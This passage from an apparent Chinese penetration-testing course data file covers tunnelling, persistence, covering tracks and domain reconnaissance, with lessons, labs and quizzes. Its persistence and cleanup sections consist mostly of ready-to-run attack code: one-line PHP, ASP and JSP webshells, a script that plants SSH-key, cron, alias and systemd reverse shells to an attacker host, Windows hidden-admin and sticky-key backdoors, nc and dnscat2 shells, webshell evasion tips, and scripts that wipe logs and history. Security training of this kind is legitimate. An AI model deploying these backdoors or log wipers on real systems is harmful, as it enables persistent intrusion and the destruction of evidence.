【隧道原理】
防火墙通常只开放少量端口(如80,443,53)，隧道技术将其他协议数据封装到这些端口传输。

隧道分类：
• 网络层隧道：ICMP、DNS、IPV6
• 传输层隧道：TCP、UDP直接传输
• 应用层隧道：HTTP、SSH、DNS

【ICMP隧道】
利用ICMP Echo数据包传输数据，ping不受防火墙限制。

ptunnel使用：
ptunnel -p target_ip -lp 1234 -da target_ip -dp 3389
# 本地1234端口转发到目标的3389

icmptunnel：
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
./icmptunnel -c
# 创建虚拟网卡tun0

防御措施：
• 检测ICMP包大小(正常ping <64字节)
• 检测异常ICMP流量
• 使用专业防火墙IDS

【DNS隧道】
DNS协议必须放行，攻击者注册域名建立DNS服务器。

iodine工具：
# 服务端
iodined -f -c -P password 10.0.0.1 tunneldomain.com
# 客户端
iodine -f -P password tunneldomain.com
# 建立后产生虚拟网卡dnsX，流量通过DNS传输

dnscat2工具：
# 服务端
ruby ./dnscat2.rb tunneldomain.com
# 客户端
./dnscat2 tunneldomain.com

防御措施：
• DNS流量监控
• 限制DNS响应大小
• 使用DNS安全扩展(DNSSEC)

【SSH隧道】
SSH隧道最常用，加密且穿透力强。

本地端口转发：
ssh -L 8080:target:80 user@gateway
# 本地8080 -> gateway -> target:80

远程端口转发(反向隧道)：
ssh -R 8080:localhost:22 user@gateway
# gateway:8080 -> 本地22

动态端口转发(代理)：
ssh -D 1080 user@gateway
# 建立SOCKS代理，通过gateway转发

X协议转发：
ssh -X user@gateway
# 转发图形界面

防御措施：
• 限制SSH命令执行
• 禁用端口转发
• 监控SSH隧道异常

【HTTP隧道】
将数据封装在HTTP协议中，穿过Web代理。

GNU Proxychains：
proxychains nmap -sT target

httptunnel：
# 服务端
hts -F localhost:22 8080
# 客户端
htc -F 1080 target 8080

防御措施：
• 检测异常HTTP行为
• 代理日志审计

【VPN隧道】
建立持久加密通道。

OpenVPN：
• 客户端配置文件
• 证书或密码认证
• TAP(桥接)/TUN(路由)模式

防御措施：
• 检测未知VPN连接
• 802.1x网络准入控制

【隧道检测】
• 流量大小异常
• 协议行为异常
• 大量DNS查询
• 非标准端口的SSH`, 
    keyPoints: ['隧道穿过防火墙', 'ICMP隧道用ping传输数据', 'DNS隧道利用DNS协议', 'SSH隧道最常用', '动态端口转发做代理', '反向隧道从内网连出'],
    codeExamples: [{ title: 'SSH隧道命令', language: 'bash', code: `# SSH隧道示例\n\n# 本地端口转发：本地访问目标服务\nssh -L 8080:target:80 user@gateway\n# 访问本地8080等于访问gateway后的target:80\n\n# 远程端口转发：让gateway访问本地服务\nssh -R 8080:localhost:22 user@gateway\n# gateway:8080转发到本地的SSH(22)\n\n# 动态端口转发：建立SOCKS代理\nssh -D 1080 user@gateway\n# 浏览器/程序设置socks5://127.0.0.1:1080\n\n# 实战反向shell\n# 目标机执行（连接外网VPS）\nssh -R 8888:localhost:22 -fN user@vps\n# VPS上访问localhost:8888等于目标SSH\n\n# 保持连接\nssh -o ServerAliveInterval=60 ...\n\n# Proxychains配合使用\nproxychains nmap -sT -p 80 target`, explanation: 'SSH隧道是最常用的隧道技术' }, { title: 'DNS隧道工具使用', language: 'bash', code: '# DNS隧道搭建 - 需要有公网域名\n\n# 1. 配置DNS A记录指向你的服务器\n# 2. 配置DNS NS记录指向A记录域名\n# ns1.tunnel.com -> 1.2.3.4\n# tunnel.com NS ns1.tunnel.com\n\n# 使用iodine建立DNS隧道\n# 服务端\niodined -f -c -P password 10.0.0.1 ns1.tunnel.com\n\n# 客户端\niodine -f -P password ns1.tunnel.com\n\n# 使用dnscat2\n# 服务端\napt install ruby\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/server\nruby ./dnscat2.rb tunnel.com\n\n# 客户端(dnscat2要求c编译)\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/client\nmake\n./dnscat tunnel.com\n\n# 进入后\nwindow -i 1\nshell', explanation: 'DNS隧道通过DNS协议传输数据' }],
    labEnvironment: [{ name: 'SSH隧道搭建练习', description: '使用Kali和靶机练习SSH隧道', url: 'https://www.kali.org/', type: 'local', setup: '1. 在Kali上开启SSH服务\n2. 从靶机连接Kali建立隧道\n3. 通过隧道访问靶机无法直接访问的服务\n4. 使用proxychains代理扫描\n5. 搭建反向shell', expectedOutput: '掌握SSH隧道的各种用法' }, { name: 'ICMP/DNS隧道练习', description: '练习建立隐蔽隧道', url: 'https://github.com/', type: 'local', setup: '1. 配置ptunnel或iodine\n2. 建立ICMP或DNS隧道\n3. 通过隧道建立稳定shell\n4. 测试传输数据和执行命令', expectedOutput: '理解隧道原理和搭建方法' }],
    recommendedTools: [{ name: 'SSH', description: 'SSH隧道工具', url: 'https://www.openssh.com/', type: 'local' }, { name: 'ptunnel', description: 'ICMP隧道工具', url: 'http://www.cs.uit.no/~daniels/PingTunnel/', type: 'local' }, { name: 'iodine', description: 'DNS隧道工具', url: 'https://github.com/yarrick/iodine', type: 'local' }, { name: 'dnscat2', description: 'DNS隧道工具', url: 'https://github.com/iagox86/dnscat2', type: 'local' }],
    quiz: [
      { type: 'single', question: '以下哪种隧道最常用于穿透防火墙？', options: ['A. ICMP', 'B. DNS', 'C. SSH', 'D. UDP'], correctIndex: 2, explanation: 'SSH隧道加密、常用且可靠，常用于穿透防火墙和建立隐蔽通道。' },
      { type: 'single', question: 'SSH动态端口转发的参数是？', options: ['A. -L', 'B. -R', 'C. -D', 'D. -X'], correctIndex: 2, explanation: '-D参数建立动态端口转发，创建SOCKS代理。' },
      { type: 'boolean', question: 'DNS隧道不需要公网域名。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'DNS隧道通常需要注册域名并配置NS记录指向攻击者服务器。' },
      { type: 'fill', question: 'SSH本地端口转发使用______参数。', correctAnswer: '-L', explanation: '-L参数将本地端口转发到远程目标。格式: -L local_port:remote_host:remote_port' },
      { type: 'multiple', question: '以下哪些是应用层隧道？（多选）', options: ['A. SSH', 'B. HTTP', 'C. DNS', 'D. ICMP'], correctIndices: [0, 1, 2], explanation: 'SSH、HTTP、DNS都是应用层隧道，ICMP是网络层。' },
      { type: 'single', question: 'iodine工具用于建立什么隧道？', options: ['A. SSH隧道', 'B. HTTP隧道', 'C. DNS隧道', 'D. ICMP隧道'], correctIndex: 2, explanation: 'iodine是DNS隧道工具，通过DNS协议传输数据。' }
    ],
    expertNotes: [
      { author: '余弦', title: '隧道选择建议', content: '实战中SSH隧道最实用，稳定且加密。如果SSH被封，用HTTP隧道或ICMP隧道。DNS隧道最隐蔽但速度慢。建立隧道后用proxychains全局代理。', url: 'https://www.kali.org/' },
      { author: '渗透测试工程师', title: '反向隧道实战', content: '目标在内网无法直接连接时，必须用反向隧道。ssh -R 8888:localhost:22 user@vps.com，让vps能访问目标内网机器。VPS要配置GatewayPorts yes。', url: 'https://www.ssh.com/ssh/port_forwarding' },
      { author: '安全研究员', title: '隧道检测防御', content: '防御隧道：1)监控异常流量大小 2)ICMP包大小检测 3)DNS隧道特征检测 4)SSH行为分析 5)禁用不必要的端口 6)网络流量基线分析。', url: 'https://www.sans.org/reading-room/whitepapers/detection/detecting-covert-channel-tunneling-34230' }
    ],
    environmentSetup: {
      prerequisites: ['两台可互相通信的Linux机器', 'SSH服务', '网络连接'],
      verificationSteps: ['1. 配置SSH服务', '2. 练习各种隧道类型', '3. 通过隧道建立shell', '4. 理解流量转发过程']
    }
  ,
      resources: [{"name": "内网隧道技术完全指南", "url": "https://www.evilsocket.net/", "type": "article"}, {"name": "Frp/Ngrok内网穿透", "url": "https://github.com/fatedier/frp", "type": "article"}, {"name": "SSH隧道技术详解", "url": "https://www.freebuf.com/articles/network/298023.html", "type": "article"}, {"name": "隐蔽通信技术", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}]},
  { 
    id: 'pen-20', 
    day: 20, 
    title: '权限维持', 
    subtitle: 'Persistence', 
    objectives: ['掌握后门植入', '注册表后门', '计划任务后门'], 
    content: `权限维持是在目标系统上建立长期访问通道，确保即使初始入口被修复也能保持连接。

【权限维持策略】
• 多重后门：Webshell、系统后门、应用后门组合
• 隐蔽性：低资源占用、无日志、少触发
• 持久性：系统重启、密码更改后仍有效
• 可恢复性：后门被删能重新植入

【Webshell后门】
一句话木马：
• ASP: <%eval request("pass")%>
• ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
• PHP: <?php @eval($_POST['pass']);?>
• JSP: <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

冰蝎Webshell：
• 加密传输、Java编写、支持多种Web容器
• 流量加密、内存马、无文件落地

哥斯拉Webshell：
• JSP/ASP/PHP全支持
• 加密隧道、插件扩展

蚁剑Webshell：
• 开源、支持多种编码器
• 模块化设计

【Windows后门】

隐藏账户：
net user hacker$ P@ssw0rd /add
net localgroup administrators hacker$ /add
# 账户名带$在net user时隐藏

注册表后门：
• 计划任务注册位置：
  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
• 添加后门程序，开机自启

粘滞键后门：
# 替换sethc.exe
copy cmd.exe C:\\Windows\\System32\\sethc.exe
# 五次Shift触发后门

远程桌面后门：
# 启用远程桌面
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

WMI后门：
• 使用WMI持久化技术
• 无文件、难检测
• 需要管理员权限

【Linux后门】

SSH后门：
• 修改SSH配置
• 添加后门账户
• 破解版openssh

SSH公钥免密登录：
echo "ssh-rsa AAAAB3... user@host" >> ~/.ssh/authorized_keys

Cron后门：
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'" >> /var/spool/cron/crontabs/root

别名后门：
alias ssh='ssh -o "ProxyCommand=/bin/bash /tmp/.hidden.sh"'

PAM后门：
• 替换PAM库
• 任意密码登录

Rootkit：
• LKM内核模块rootkit
• 隐藏进程、端口、文件

【应用层后门】

Meterpreter后门：
• 使用metsvc创建服务
• 使用persistence脚本

NC后门：
# 正向shell
nc -lvp 4444 -e /bin/bash
# 反向shell
nc attacker 4444 -e /bin/bash

【权限维持检测】

Windows检测：
• 检查注册表Run键
• 检查计划任务
• net user查看隐藏账户
• 查看异常进程
• 日志分析

Linux检测：
• 检查crontab任务
• 检查SSH authorized_keys
• 检查异常进程和连接
• 检查alias
• 检查系统账户`, 
    keyPoints: ['权限维持保持长期访问', 'Webshell是最常见的Web后门', '注册表可藏后门', '计划任务可定期执行', 'sethc.exe粘滞键后门', 'SSH公钥可免密码登录'],
    codeExamples: [{ title: '多种后门创建脚本', language: 'bash', code: `#!/bin/bash\n# Linux权限维持脚本\n\n# 1. SSH公钥后门\nmkdir -p ~/.ssh\necho "ssh-rsa AAAAB3NzaC1... attacker@backdoor" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n\n# 2. Cron任务后门\necho "*/5 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" >> /var/spool/cron/crontabs/root\n\n# 3. alias别名后门\necho "alias ssh=ssh -o ProxyCommand=/tmp/.hidden.sh" >> ~/.bashrc\necho "#!/bin/bash" > /tmp/.hidden.sh\necho "/bin/bash -i >& /dev/tcp/attacker/4445 0>&1" >> /tmp/.hidden.sh\nchmod +x /tmp/.hidden.sh\n\n# 4. systemd服务后门\ncat > /etc/systemd/system/update.service << EOF\n[Unit]\nDescription=System Update\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -i >& /dev/tcp/attacker/4446 0>&1\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload\nsystemctl enable update\necho "[+] Backdoors created"`, explanation: 'Linux权限维持脚本，创建多种后门' }, { title: 'Windows注册表后门', language: 'powershell', code: '# Windows权限维持\n\n# 1. 注册表Run键后门\nreg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\temp\\backdoor.exe" /f\n\n# 2. 创建隐藏用户\nnet user hacker$ P@ssw0rd123 /add\nnet localgroup administrators hacker$ /add\n\n# 3. 粘滞键后门\ncopy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n\n# 4. 远程桌面开启\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n# 5. WMI后门\n$Filter = Set-WMIInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name = "SystemUpdateFilter"\n    QueryLanguage = "WQL"\n    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA Win32_LocalTime"\n}\n\n# 6. 服务后门\nsc create "SystemUpdate" binpath= "C:\\temp\\backdoor.exe" start= auto displayname= "System Update Service"\nsc description "SystemUpdate" "Windows系统更新服务"', explanation: 'Windows权限维持的多种方法' }],
    labEnvironment: [{ name: '权限维持练习', description: '在靶机上练习各种后门', url: 'https://www.vulnhub.com/', type: 'online', setup: '1. 获取靶机shell\n2. 创建Webshell后门\n3. 创建计划任务后门\n4. 创建SSH公钥后门\n5. 验证后门有效性\n6. 测试重启后门是否存活', expectedOutput: '掌握多种权限维持技术' }, { name: 'Webshell连接练习', description: '练习使用Webshell管理工具', url: 'https://github.com/', type: 'online', setup: '1. 上传一句话webshell到靶机\n2. 使用蚁剑/冰蝎/哥斯拉连接\n3. 测试文件管理、命令执行功能\n4. 尝试获取更多信息', expectedOutput: '熟练使用Webshell管理工具' }],
    recommendedTools: [{ name: '蚁剑', description: 'Webshell管理工具', url: 'https://github.com/AntSwordProject/AntSword', type: 'local' }, { name: '冰蝎', description: '加密Webshell工具', url: 'https://github.com/rebeyond/Behinder', type: 'local' }, { name: '哥斯拉', description: 'Webshell管理工具', url: 'https://github.com/BeichenDream/Godzilla', type: 'local' }, { name: 'Metasploit persistence', description: 'Metasploit持久化模块', url: 'https://www.metasploit.com/', type: 'local' }],
    quiz: [
      { type: 'single', question: '以下哪个不是常见的后门类型？', options: ['A. Webshell', 'B. 计划任务后门', 'C. 端口扫描后门', 'D. 注册表后门'], correctIndex: 2, explanation: '端口扫描是侦察技术，不是后门类型。Webshell、注册表后门、计划任务后门都是常见权限维持方式。' },
      { type: 'single', question: 'PHP一句话木马的基本格式？', options: ['A. <%eval request("pass")%>', 'B. <?php @eval($_POST["pass"]);?>', 'C. <script>alert(1)</script>', 'D. system($_GET["cmd"])'], correctIndex: 1, explanation: 'PHP一句话木马使用eval执行POST提交的代码。' },
      { type: 'boolean', question: '带$后缀的用户名在net user命令中不可见。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: 'net user hacker$只显示为hacker，隐藏了$符号。' },
      { type: 'fill', question: 'Windows注册表中，开机自启的程序位于CurrentVersion\\______键下。', correctAnswer: 'Run', explanation: 'HKLM/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run是常见的自启动位置。' },
      { type: 'multiple', question: '以下哪些是Linux权限维持技术？（多选）', options: ['A. Cron任务', 'B. SSH公钥', 'C. 注册表Run键', 'D. alias别名'], correctIndices: [0, 1, 3], explanation: 'Cron任务、SSH公钥、alias别名都是Linux权限维持技术，注册表是Windows的。' },
      { type: 'single', question: '粘滞键后门通过什么触发？', options: ['A. Ctrl+Alt+Delete', 'B. 五次Shift键', 'C. Win键', 'D. Alt+F4'], correctIndex: 1, explanation: '连续按五次Shift键会触发sethc.exe，利用这个特性植入后门。' }
    ],
    expertNotes: [
      { author: '余弦', title: '权限维持实战建议', content: '实战中要建立多层后门：Webshell+SSH公钥+Cron任务+注册表。Webshell最常用但易被发现，SSH公钥最稳定。要平衡隐蔽性和持久性。', url: 'https://github.com/AntSwordProject/AntSword' },
      { author: '渗透测试工程师', title: 'Webshell免杀技巧', content: 'webshell容易被查杀，使用冰蝎或哥斯拉等加密Webshell。尽量使用内存马，文件不落地。避免使用eval，使用assert等替代函数。', url: 'https://github.com/rebeyond/Behinder' },
      { author: '安全研究员', title: '权限维持检测', content: '检测权限维持：1)定期检查注册表Run键 2)检查异常计划任务和cron 3)检查SSH authorized_keys 4)监控新增进程和端口 5)日志审计异常行为。', url: 'https://www.sans.org/reading-room/whitepapers/malicious/persistence-detecting-achieving-persistence-37886' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux', '靶机shell', 'Webshell工具'],
      verificationSteps: ['1. 创建多种后门', '2. 测试后门有效性', '3. 模拟目标重启验证持久性', '4. 学习检测方法']
    }
  ,
      resources: [{"name": "Windows权限维持技术", "url": "https://attack.mitre.org/tactics/TA0003/", "type": "article"}, {"name": "后门技术完全指南", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}, {"name": "Webshell免杀技术", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "域环境权限维持", "url": "https://www.freebuf.com/articles/system/298023.html", "type": "article"}]},
  { 
    id: 'pen-21', 
    day: 21, 
    title: '痕迹清理', 
    subtitle: 'Covering Tracks', 
    objectives: ['掌握日志清理', '文件清除', '时间戳修改'], 
    content: `痕迹清理是掩盖入侵行为、避免被发现的重要环节，渗透测试中必须确保不会暴露客户系统。

【Windows日志系统】

Windows事件日志类型：
• Security：安全相关，登录、注销、策略更改
• System：系统组件事件，服务启动停止、驱动加载
• Application：应用程序事件
• Setup：系统安装事件

日志位置：
• C:\\Windows\\System32\\winevt\\Logs\\
• Security.evtx、System.evtx、Application.evtx

【Windows日志清理命令】

使用wevtutil：
wevtutil cl Security     # 清理安全日志
weevtutil cl System       # 清理系统日志
wevtutil cl Application   # 清理应用日志
wevtutil cl "Setup"       # 清理安装日志

使用PowerShell：
Clear-EventLog -LogName Security,System,Application
Remove-EventLog -LogName "LogName"

使用Metasploit：
clearev    # 清除Meterpreter日志
# 在shell中执行
meterpreter > clearev

注册表键值清理：
• HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU
• 最近打开文件记录

【Linux日志系统】

主要日志文件：
• /var/log/auth.log - 认证日志(SSH、sudo、 PAM)
• /var/log/syslog - 系统日志
• /var/log/access.log - Apache/Nginx访问日志
• /var/log/error.log - 错误日志
• /var/log/apache2/access.log
• /var/log/nginx/access.log
• /var/log/messages - 内核和系统消息

【Linux日志清理命令】

清空日志文件：
> /var/log/auth.log           # 清空认证日志
> /var/log/syslog             # 清空系统日志
cat /dev/null > /var/log/auth.log  # 效果相同

删除特定行：
# 删除包含特定IP的日志
sed -i '/192.168.1.100/d' /var/log/auth.log
# 删除最后10行
sed -i '$ d' /var/log/auth.log

历史命令清理：
unset HISTORY HISTFILE HISTFILESIZE HISTSIZE   # 当前会话禁用历史
rm -f ~/.bash_history          # 删除历史文件
ln -sf /dev/null ~/.bash_history  # 链接到空设备

Shells日志清理：
• /etc/ssh/sshd_config - 配置日志
• /var/log/wtmp - 登录记录(btmp记录失败)
• /var/run/utmp - 当前登录(w命令查看)
• /var/log/lastlog - 所有用户最后登录

【文件时间戳修改】

时间戳类型：
• Access Time (atime): 最后访问时间
• Modify Time (mtime): 内容修改时间
• Change Time (ctime): 元数据(权限、所有者)修改时间

查看时间戳：
stat filename
ls -l    # mtime
ls -lu   # atime
ls -lc   # ctime

修改时间戳：
touch -t 202401011200 file.txt         # 设置为指定时间
touch -r reference.txt target.txt      # 复制参考文件时间戳
touch -d "2 days ago" file.txt         # 设置为2天前

【Metasploit痕迹清理】

meterpreter > clearev    # 清除所有日志
meterpreter > rm -f file # 删除文件不留痕迹

【日志恢复风险】

日志删除≠完全消失：
• 日志文件被删除但进程仍持有文件描述符
• 内存中可能暂存日志
• 专业取证可恢复删除文件
• 建议多次覆写或破坏性删除

【痕迹清理注意事项】
• 清理时避免破坏系统日志导致异常
• 最好保留部分正常日志避免被发现
• 修改时间戳避免明显异常
• 清理后检查是否成功
• 注意监控和审计系统的检测`, 
    keyPoints: ['清理日志掩盖入侵痕迹', 'Linux日志在/var/log', 'Windows用wevtutil清日志', '历史命令也需清理', '时间戳修改避免发现', 'clearev可清除Meterpreter日志'],
    codeExamples: [{ title: 'Windows日志清理脚本', language: 'powershell', code: `# Windows痕迹清理脚本\n\n# 清理Windows事件日志\nwevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\nwevtutil cl Setup\n\n# 清理最近运行记录\nRemove-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\*" -ErrorAction SilentlyContinue\nRemove-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\*" -ErrorAction SilentlyContinue\n\n# 清理Prefetch\nRemove-Item -Path "C:\\Windows\\Prefetch\\*.pf" -Force -ErrorAction SilentlyContinue\n\n# 清理临时文件\nRemove-Item -Path "C:\\Windows\\Temp\\*" -Recurse -Force -ErrorAction SilentlyContinue\nRemove-Item -Path "$env:TEMP\\*" -Recurse -Force -ErrorAction SilentlyContinue\n\n# 清理回收站\nClear-RecycleBin -Force -ErrorAction SilentlyContinue\n\necho "[+] Windows logs and traces cleared"`, explanation: 'Windows痕迹清理综合脚本' }, { title: 'Linux日志清理脚本', language: 'bash', code: '#!/bin/bash\n# Linux痕迹清理脚本\n\necho "[*] Clearing Linux logs and traces...\"\n\n# 清空认证日志\n> /var/log/auth.log\necho \"\" > /var/log/auth.log\n\n# 清空系统日志\n> /var/log/syslog\ncat /dev/null > /var/log/syslog\n\n# 清空Apache/Nginx日志\n> /var/log/apache2/access.log\n> /var/log/apache2/error.log\n> /var/log/nginx/access.log\n> /var/log/nginx/error.log\n\n# 清理bash历史\nunset HISTORY HISTFILE HISTFILESIZE HISTSIZE\nrm -f ~/.bash_history\nln -sf /dev/null ~/.bash_history\n\n# 清理用户最近登录记录\n> /var/log/wtmp\n> /var/log/btmp\n> /var/log/lastlog\n\n# 清理命令历史记录\nhistory -cw\n\n# 删除临时文件\nrm -rf /tmp/*\nrm -rf /var/tmp/*\n\n# 清理邮件\n> /var/mail/root\n> /var/mail/*\n\necho \"[+] Logs cleared. Remember to also clear shell history and any uploaded files.\"', explanation: 'Linux痕迹清理综合脚本' }],
    labEnvironment: [{ name: '痕迹清理练习', description: '在靶机上练习痕迹清理', url: 'https://www.vulnhub.com/', type: 'online', setup: '1. 获取靶机shell\n2. 查看当前日志内容\n3. 执行痕迹清理操作\n4. 验证日志已被清空\n5. 检查是否还有残留痕迹', expectedOutput: '掌握日志清理技术' }, { name: '时间戳修改练习', description: '练习修改文件时间戳', url: 'https://www.kali.org/', type: 'local', setup: '1. 创建测试文件\n2. 使用stat查看时间戳\n3. 使用touch修改时间戳\n4. 使用-r复制其他文件时间戳\n5. 验证时间戳已修改', expectedOutput: '掌握时间戳修改方法' }],
    recommendedTools: [{ name: 'Metasploit clearev', description: '日志清理命令', url: 'https://www.metasploit.com/', type: 'local' }, { name: 'wevtutil', description: 'Windows日志管理工具', url: 'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil', type: 'local' }, { name: 'BleachBit', description: '系统清理工具', url: 'https://www.bleachbit.org/', type: 'local' }, { name: 'Secure Delete', description: '安全删除工具', url: 'https://sourceforge.net/projects/sdelete/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Windows中清理事件日志的命令？', options: ['A. del *.log', 'B. wevtutil cl', 'C. clear', 'D. rm'], correctIndex: 1, explanation: 'wevtutil cl是Windows专门的事件日志清理命令。' },
      { type: 'single', question: 'Linux中清空日志文件的命令？', options: ['A. rm auth.log', 'B. > /var/log/auth.log', 'C. mv auth.log /tmp', 'D. grep -v auth.log'], correctIndex: 1, explanation: '使用>清空文件内容比rm安全，因为不会中断日志进程且能保留文件结构。' },
      { type: 'boolean', question: '清理Shell历史记录只需删除.bash_history文件。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '还需要unset HISTORY HISTFILE HISTFILESIZE HISTSIZE，当前会话的命令可能还在内存中。' },
      { type: 'fill', question: 'touch -______ reference.txt target.txt 可以复制时间戳。', correctAnswer: 'r', explanation: 'touch -r reference.txt target.txt将目标文件时间戳设为与参考文件相同。' },
      { type: 'multiple', question: '以下哪些是Linux认证日志位置？（多选）', options: ['A. /var/log/auth.log', 'B. /var/log/syslog', 'C. /var/log/access.log', 'D. /var/log/wtmp'], correctIndices: [0, 1, 3], explanation: '/var/log/auth.log记录认证信息，/var/log/syslog记录系统事件，/var/log/wtmp记录登录信息。/var/log/access.log是Web访问日志。' },
      { type: 'single', question: 'Metasploit中清除Meterpreter日志的命令？', options: ['A. clearev', 'B. clear logs', 'C. rm logs', 'D. delete logs'], correctIndex: 0, explanation: 'clearev命令清除Meterpreter session的所有日志记录。' }
    ],
    expertNotes: [
      { author: '余弦', title: '痕迹清理实战建议', content: '清理日志时不要全部清空，会很明显。最好保留一些正常日志。清理.bash_history时记得ln -sf /dev/null ~/.bash_history，否则新建shell还会写。', url: 'https://www.metasploit.com/' },
      { author: '渗透测试工程师', title: '时间戳修改技巧', content: 'webshell上传后要修改时间戳与正常文件一致。stat查看原始文件时间，然后用touch -r复制。修改前后的时间差太大会被发现异常。', url: 'https://www.kali.org/' },
      { author: '安全研究员', title: '取证注意事项', content: '专业取证可以从删除的磁盘区域恢复文件。真正的安全擦除需要多次覆写(srm -s命令)。但在常规渗透测试中，普通清理已足够。', url: 'https://www.sans.org/reading-room/whitepapers/incidenthandling/erasing-digital-evidence-532' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux', '靶机shell', '日志访问权限'],
      verificationSteps: ['1. 查看当前日志内容', '2. 执行痕迹清理', '3. 验证清理效果', '4. 检查时间戳是否异常']
    }
  ,
      resources: [{"name": "痕迹清理技术汇总", "url": "https://attack.mitre.org/techniques/T1070/", "type": "article"}, {"name": "日志清除与绕过", "url": "https://www.freebuf.com/articles/system/278901.html", "type": "article"}, {"name": "Linux痕迹清理", "url": "https://www.anquanke.com/post/id/298023", "type": "article"}, {"name": "Windows事件日志操作", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}]}
];

const week4: CyberDay[] = [
  { 
    id: 'pen-22', 
    day: 22, 
    title: '内网渗透基础', 
    subtitle: 'Internal Network Pentest', 
    objectives: ['理解域环境架构', '掌握内网信息收集', '学会定位域控制器', '了解BloodHound使用'], 
    content: `内网渗透是渗透测试中非常重要的环节，涉及域环境和Workgroup两种网络架构。

【内网环境分类】
• Workgroup（工作组）：分散式管理，每台机器独立管理，适合小型网络
• Active Directory（域）：集中式管理，所有机器由域控制器统一管理，适合中大型企业

【域环境核心组件】
• Domain Controller（域控制器）：存储所有域用户、计算机、策略信息，运行AD DS服务
• LDAP：轻量级目录访问协议，用于查询和更新AD数据库
• DNS：域环境中解析主机名，SRV记录定位域服务
• Kerberos：默认认证协议，使用票据机制

【内网信息收集命令】
• net view /domain - 查看当前域
• net view /domain:DOMAINNAME - 查看指定域内主机
• net user /domain - 查看域用户列表
• net user username /domain - 查看指定用户详情
• net group "Domain Admins" /domain - 查看域管理员组
• net group "Domain Computers" /domain - 查看域内所有计算机
• nltest /domain_trusts - 查看域信任关系

【定位域控制器方法】
• nslookup -type=srv _kerberos._tcp - 查询Kerberos服务记录
• nslookup -type=srv _ldap._tcp - 查询LDAP服务记录
• net time /domain - 通过时间服务定位DC
• echo %logonserver% - 查看当前登录的DC

【内网主机发现】
• for /L %i in (1,1,254) do @ping -n 1 -w 1 192.168.1.%i | findstr "TTL" - Windows批量Ping扫描
• nmap -sn 192.168.1.0/24 - Nmap主机发现
• CrackMapExec crackmapexec 192.168.1.0/24 - 批量扫描内网

【内网端口扫描】
• 22(SSH)、23(Telnet)、80(HTTP)、443(HTTPS)
• 445(SMB)、3389(RDP)、1433(MSSQL)
• 3306(MySQL)、6379(Redis)、27017(MongoDB)

【域内横向移动前期准备】
• net.exe enumdnsdomains - 枚举域
• dsquery.exe user - 查找域用户
• psloggedon.exe \\\\target - 查看远程登录用户
• BloodHound bloodhound-python -d domain -u user -p pass - Collection

【域环境渗透思路】
1. 定位域控制器
2. 枚举域用户和计算机
3. 查找域管理员会话
4. 横向移动到域管机器
5. 获取域管权限
6. 实现域权限维持`, 
    keyPoints: ['域环境统一管理是核心', 'DNS SRV记录定位域控', 'net view查看域内主机', 'CrackMapExec批量扫描内网', 'BloodHound分析域内关系'],
    codeExamples: [{ title: '内网信息收集脚本', language: 'python', code: `import subprocess\nimport socket\n\ndef get_domain_info():\n    \"\"\"收集域环境信息\"\"\"\n    commands = [\n        ("查看当前域", "net view /domain"),\n        ("查看域用户", "net user /domain"),\n        ("查看域管理员", "net group \"Domain Admins\" /domain"),\n        ("查看域计算机", "net group \"Domain Computers\" /domain"),\n        ("定位DNS服务器", "nslookup -type=srv _kerberos._tcp"),\n    ]\n    \n    for desc, cmd in commands:\n        print(f\"\\n=== {desc} ===\")\n        try:\n            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n            print(result.stdout)\n        except Exception as e:\n            print(f\"Error: {e}\")\n\ndef scan_network(network_prefix, start=1, end=254):\n    \"\"\"内网主机发现\"\"\"\n    print(f\"\\n=== 扫描 {network_prefix}.0/24 网段 ===\")\n    alive_hosts = []\n    for i in range(start, end + 1):\n        ip = f\"{network_prefix}.{i}\"\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(0.1)\n            result = sock.connect_ex((ip, 445))\n            if result == 0:\n                alive_hosts.append(ip)\n                print(f\"[+] 主机在线: {ip} (SMB开放)\")\n            sock.close()\n        except:\n            pass\n    return alive_hosts\n\nif __name__ == \"__main__\":\n    get_domain_info()\n    # scan_network(\"192.168.1\")`, explanation: '内网信息收集脚本，收集域环境信息并扫描存活主机' }],
